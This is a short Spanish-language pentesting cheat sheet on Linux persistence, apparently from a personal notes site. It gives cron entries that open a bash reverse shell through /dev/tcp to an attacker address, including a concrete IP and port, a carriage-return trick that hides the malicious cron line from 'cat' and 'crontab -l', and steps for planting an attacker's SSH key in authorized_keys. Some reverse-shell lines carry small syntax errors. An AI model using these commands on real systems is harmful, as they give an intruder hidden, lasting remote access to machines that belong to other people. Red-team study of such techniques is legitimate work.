# Persistencia

## Via cronjobs

Con `crontab -e`  podemos editar las entradas cron para generarnos una reverse shell:

```bash
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port>0>&1'
```

O añadirlo directamente al archivo cron

```bash
echo -e "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port>0>&1'" >> /var/spool/cron/crontabs/<user>
```

Se puede sobreescribir con un carriage return el output del fichero cron para ocultarlo al hacerle un `cat` o un `crontab -l`:



{% code overflow="wrap" lineNumbers="true" %}
```bash
echo -e "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/191.168.2.102/445 >&1'#\r                                                                    <blank-spaces>    "  >> /var/spool/cron/crontabs/<user>

#### Con nano 
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/191.168.2.102/445 >&1 #alt-v+Ctrl-m# anything can go here this overwrites the cron entry you could just put lots of spaces here or a dummy cron entry

#### Con vim
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/191.168.2.102/445 >&1 #Ctrl-v+Ctrl-m# anything can go here this overwrites the cron entry you could just put lots of spaces here or a dummy cron entry
```
{% endcode %}



## SSH keys

En la máquina atacante ejecutamos lo siguiente:

```bash
## Creamos las claves públicas y privadas para ssh
ssh-keygen

## Y las pegamos en la carpeta ssh del usuario al que nos querramos autenticar 
mkdir ~/.ssh
touch ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE5ThfNkpxcuckshT4Z0Ht84SZoHsfy7zEgHdbJrmJOv kali@kali" >> ~/.ssh/authorized_keys
```



